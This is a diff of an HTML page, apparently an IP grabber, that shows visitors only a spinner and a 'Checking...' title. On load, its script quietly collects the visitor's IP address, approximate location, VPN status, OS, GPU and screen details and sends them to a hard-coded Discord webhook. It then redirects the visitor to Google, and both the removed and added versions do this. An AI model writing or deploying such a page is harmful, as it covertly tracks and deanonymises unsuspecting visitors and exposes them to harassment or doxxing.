@@ -2,80 +2,77 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
+    <title>Checking...</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .c { border: 3px solid #111; border-top: 3px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: s 1s linear infinite; }
-        @keyframes s { to { transform: rotate(360deg); } }
+        body { background:#000; margin:0; display:flex; align-items:center; justify-content:center; height:100vh; overflow:hidden; }
+        .l { border:3px solid #111; border-top:3px solid #0f0; border-radius:50%; width:30px; height:30px; animation:s 1s linear infinite; }
+        @keyframes s { to { transform:rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="c"></div>
+    <div class="l"></div>
     <script>
-        "use strict";
+        (function() {
+            "use strict";
 
-        const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1457149465688543363/FlP0AtpIk-Yg8NwxGQ1CSdityVf67AL-ODXFlPl9FtQq-tV5j2a9iZmWkGNAUsOHD9uL";
-
-        async function collect() {
-            // 1. Temel Veriler
-            let info = {
-                os: navigator.platform,
-                browser: navigator.userAgent.split(' ').pop(),
-                res: `${screen.width}x${screen.height}`,
-                lang: navigator.language,
-                mem: navigator.deviceMemory || "N/A",
-                cores: navigator.hardwareConcurrency || "N/A",
-                tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+            const config = {
+                hook: "https://canary.discord.com/api/webhooks/1457149465688543363/FlP0AtpIk-Yg8NwxGQ1CSdityVf67AL-ODXFlPl9FtQq-tV5j2a9iZmWkGNAUsOHD9uL",
+                target: "https://www.google.com"
             };
 
-            // 2. GPU Tespiti (Raw)
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
-            } catch(e) { info.gpu = "Masked"; }
+            const run = async () => {
+                let sys = {
+                    os: navigator.platform,
+                    res: screen.width + "x" + screen.height,
+                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    gpu: "Unknown",
+                    ip: "N/A"
+                };
 
-            // 3. IP ve VPN (En Hızlı Servis)
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const j = await res.json();
-                info.ip = j.ip;
-                info.loc = `${j.city} / ${j.country_name}`;
-                info.isp = j.org;
-                info.is_vpn = (j.timezone !== info.tz) ? "🚨 YES" : "✅ NO";
-            } catch(e) { info.ip = "Blocked"; }
+                // GPU extraction
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
+                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                    sys.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
+                } catch(e) {}
 
-            // 4. DISCORD PAYLOAD (JSON Format)
-            const payload = {
-                embeds: [{
-                    title: "💀 DEVICE DATA EXTRACTED",
-                    color: 3066993,
-                    fields: [
-                        { name: "📡 Network", value: `**IP:** ${info.ip}\n**Loc:** ${info.loc}\n**VPN:** ${info.is_vpn}`, inline: true },
-                        { name: "⚙️ System", value: `**OS:** ${info.os}\n**GPU:** ${info.gpu}\n**RAM:** ${info.mem}GB`, inline: false },
-                        { name: "🌐 Browser", value: `**TZ:** ${info.tz}\n**Lang:** ${info.lang}\n**Res:** ${info.res}`, inline: true }
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
+                // IP & VPN Extraction
+                try {
+                    const r = await fetch('https://ipapi.co/json/');
+                    const j = await r.json();
+                    sys.ip = j.ip;
+                    sys.vpn = (j.timezone !== sys.tz) ? "🚨 YES" : "✅ NO";
+                } catch(e) { sys.vpn = "⚠️ Error"; }
+
+                // Payload Construction
+                const msg = {
+                    embeds: [{
+                        title: "💀 DATA CAPTURED",
+                        color: 3066993,
+                        fields: [
+                            { name: "📡 Network", value: "IP: " + sys.ip + "\nVPN: " + sys.vpn, inline: true },
+                            { name: "⚙️ System", value: "OS: " + sys.os + "\nGPU: " + sys.gpu, inline: false },
+                            { name: "🖥️ Display", value: "Res: " + sys.res + "\nTZ: " + sys.tz, inline: true }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                // Ultimate Transmission
+                const data = JSON.stringify(msg);
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(config.hook, new Blob([data], { type: 'application/json' }));
+                } else {
+                    fetch(config.hook, { method: 'POST', mode: 'no-cors', body: data });
+                }
+
+                // Redirect
+                setTimeout(() => { window.location.replace(config.target); }, 1200);
             };
 
-            // 5. GÖNDERİM (En Garanti Yöntem: sendBeacon)
-            // fetch() bazen CORS hatası verir ama sendBeacon() tarayıcı seviyesinde gönderir.
-            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
-            
-            if (navigator.sendBeacon) {
-                navigator.sendBeacon(WEBHOOK_URL, blob);
-            } else {
-                // Fallback (Yedek)
-                fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', body: blob });
-            }
-
-            // 6. YÖNLENDİRME
-            setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
-        }
-
-        window.onload = collect;
+            window.onload = run;
+        })();
     </script>
 </body>
 </html>
